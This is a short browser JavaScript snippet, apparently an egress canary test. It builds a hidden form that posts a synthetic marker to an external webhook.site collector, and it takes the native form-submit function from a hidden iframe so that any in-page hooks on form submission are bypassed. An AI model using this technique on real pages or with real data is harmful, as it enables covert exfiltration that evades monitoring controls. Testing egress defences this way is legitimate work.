(() => {
  "use strict";

  const MARKER = "PUBLIC_SHARE_CLEAN_REALM_FORM_EGRESS_20261107";
  const COLLECTOR =
    "https://webhook.site/dc3d2613-f9e0-4105-80d5-0f3c9328557c";

  const status = document.createElement("pre");
  status.id = "clean-realm-form-egress-status";
  status.style.cssText = [
    "box-sizing:border-box",
    "margin:12px",
    "padding:12px",
    "border:1px solid #f97316",
    "border-radius:8px",
    "white-space:pre-wrap",
    "font:13px/1.4 ui-monospace,monospace",
  ].join(";");
  status.textContent = `${MARKER} preparing`;
  document.body.appendChild(status);

  const form = document.createElement("form");
  form.method = "POST";
  form.action = COLLECTOR;
  form.target = "_self";
  form.hidden = true;

  const markerField = document.createElement("input");
  markerField.name = "marker";
  markerField.value = MARKER;
  form.appendChild(markerField);

  const sourceField = document.createElement("input");
  sourceField.name = "source";
  sourceField.value = "synthetic-clean-realm-canary";
  form.appendChild(sourceField);
  document.body.appendChild(form);

  const cleanRealm = document.createElement("iframe");
  cleanRealm.hidden = true;
  cleanRealm.setAttribute("aria-hidden", "true");
  document.body.appendChild(cleanRealm);

  const nativeSubmit =
    cleanRealm.contentWindow?.HTMLFormElement?.prototype?.submit;
  if (typeof nativeSubmit !== "function") {
    status.textContent = `${MARKER} clean-submit-unavailable`;
    return;
  }

  status.textContent = `${MARKER} submitting`;
  nativeSubmit.call(form);
})();
